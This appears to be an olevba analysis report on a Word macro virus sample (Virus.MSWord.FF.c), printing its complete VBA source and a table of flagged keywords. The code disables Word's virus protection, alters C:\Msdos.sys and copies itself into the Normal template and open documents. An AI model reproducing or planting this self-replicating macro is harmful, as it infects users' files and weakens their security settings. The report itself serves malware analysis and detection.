olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FF.c-fb451f7b85cd8d48c758c1f5b15085eb4c1f5b09
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FF.c-fb451f7b85cd8d48c758c1f5b15085eb4c1f5b09 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()

End Sub

Private Sub document_Open(): On Error Resume Next: Options.ConfirmConversions = (0 - 0): Options.SaveNormalPrompt = (1 - 1): Options.VirusProtection = (2 - 2): CommandBars("Tools").Controls("Macro").Delete
If Day(1) Then: SetAttr "C:\Msdos.sys", vbNormal: System.PrivateProfileString("C:\Msdos.sys", "Options", "BootGUI") = "0": SetAttr "C:\Msdos.sys", vbSystem + vbHidden + vbReadOnly
Open "C:\FF.sys" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).codemodule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).codemodule.CountOfLines): Close #1
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.deletelines 1, NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines: ActiveDocument.VBProject.VBComponents.Item(1).codemodule.deletelines 1, ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.AddFromFile ("C:\FF.sys"): ActiveDocument.VBProject.VBComponents.Item(1).codemodule.AddFromFile ("C:\FF.sys"): ActiveDocument.SaveAs FileName = ActiveDocument.FullName: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

